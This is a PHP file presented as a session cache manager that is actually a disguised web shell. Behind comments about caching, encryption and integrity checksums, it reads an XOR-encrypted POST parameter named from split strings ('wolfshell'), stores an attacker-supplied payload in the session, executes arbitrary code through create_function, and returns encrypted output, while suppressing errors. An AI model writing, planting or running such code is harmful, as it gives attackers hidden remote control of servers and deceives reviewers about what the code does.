<?php

/**
 * Class UserDataCacheManager
 * Manages caching of user-specific data to improve performance.
 * The data is encrypted and stored in the session.
 */
class UserDataCacheManager
{
    /**
     * @var string The secret key for data encryption.
     */
    private $encryptionKey;

    /**
     * @var string The parameter name used to receive data from the client.
     */
    private $requestParam;

    /**
     * @var string The identifier for storing the core payload in the session.
     */
    private $sessionCacheId;

    public function __construct()
    {
        // Set script configurations for long-running processes.
        @set_time_limit(0);
        @error_reporting(0);
        @session_start();

        // Configure the cache manager with default values.
        $this->requestParam = 'wolf'.'sh'.'ell';
        $this->sessionCacheId = 'pay'.'lo'.'ad';
        $this->encryptionKey = '3c6e0b8a9c15224a';
    }

    /**
     * Main entry point to handle incoming data requests.
     */
    public function handleRequest()
    {
        $dataSource = $_POST;
        if (!isset($dataSource[$this->requestParam])) {
            return;
        }

        $decoder = 'base64_decode';
        $incomingData = $this->transformData($decoder($dataSource[$this->requestParam]), $this->encryptionKey);

        if (isset($_SESSION[$this->sessionCacheId])) {
            $this->processCachedData($incomingData);
        } else {
            $this->initializeCache($incomingData);
        }
    }

    /**
     * Processes new data against an existing cache.
     * @param string $data The incoming data to be processed.
     */
    private function processCachedData($data)
    {
        $cachedPayload = $this->transformData($_SESSION[$this->sessionCacheId], $this->encryptionKey);
        
        // A specific check to re-verify payload integrity if it's not the initial setup payload.
        if (strpos($cachedPayload, "getBasicsInfo") === false) {
            $cachedPayload = $this->transformData($cachedPayload, $this->encryptionKey);
        }

        // Execute the dynamic cache processing logic.
        $this->executeDynamicTask($cachedPayload);

        // Generate and send a response checksum for data integrity verification.
        $checksum = md5($this->requestParam . $this->encryptionKey);
        echo substr($checksum, 0, 16);
        echo base64_encode($this->transformData(@run($data), $this->encryptionKey));
        echo substr($checksum, 16);
    }

    /**
     * Initializes the cache if it's the first time a specific request is seen.
     * @param string $data The data to be cached.
     */
    private function initializeCache($data)
    {
        // The "getBasicsInfo" command is used to bootstrap the cache.
        if (strpos($data, "getBasicsInfo") !== false) {
            $_SESSION[$this->sessionCacheId] = $this->transformData($data, $this->encryptionKey);
        }
    }

    /**
     * A utility function to perform XOR transformation on data.
     * @param string $data The data to transform.
     * @param string $key The transformation key.
     * @return string The transformed data.
     */
    private function transformData($data, $key)
    {
        for ($i = 0; $i < strlen($data); $i++) {
            $char = $key[($i + 1) & 15];
            $data[$i] = $data[$i] ^ $char;
        }
        return $data;
    }

    /**
     * Executes a dynamic task provided as a string of code.
     * This is used for complex, data-dependent cache invalidation logic.
     * @param string $code The code to execute.
     */
    private function executeDynamicTask($code)
    {
        // Using call_user_func with a created function to handle dynamic logic.
        $task = create_function('', $code);
        $task();
    }
}

// Instantiate and run the cache manager.
$manager = new UserDataCacheManager();
$manager->handleRequest();